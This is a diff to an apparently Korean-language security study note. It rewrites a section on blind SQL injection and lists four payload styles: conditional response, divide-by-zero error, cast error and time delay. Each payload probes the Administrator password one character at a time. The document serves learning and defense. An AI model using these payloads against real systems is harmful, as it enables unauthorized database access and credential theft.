@@ -223,14 +223,35 @@ $stmt->bind_param("ss", $EID, $PASSWORD);
 $stmt->execute();
 ```
 
-### SQL Error
-> 의도적으로 SQL Error를 발생시키는 공격 기법
+### Blind SQL Injection
+> SQL Injection 공격을 통해, DB에 대한 정보를 탈취하는 기법
+
+1. Conditional Response
+```sql
+/* Password의 첫번째 문자가 'm'보다 큰지 확인 */ 
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+/* Password의 첫번째 문자가 't'보다 큰지 확인 */
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+```
+2. SQL Error - Divide by Zero
 
 ```sql
-CAST((SELECT example_column FROM example_table) as int)
---> ERROR: invalid input syntax for type integer: "Example data"
-IF (SELECT COUNT(USERNAME) FROM USERS WHERE USERNAME='ADMINISTRATOR' AND SUBSTRING(PASSWORD, 1, 1) > 'M') = 1 WAITFOR DELAY '0:0:{DELAY}'--
---> Time Delay 발생
+/* Password의 첫번째 문자가 'm'보다 크면 오류 발생 */
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) >
+'m') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+
+3. SQL Error  - Cast
+```sql
+/* Password의 첫번째 문자가 'm'보다 크면 오류 발생 */
+CAST((SELECT example_column FROM example_table) AS int)
+```
+
+4. Time Delay
+```sql
+/* Password의 첫번째 문자가 'm'보다 크면 딜레이 발생 */
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND
+SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'-
 ```
 
 ## ShellShock Attack
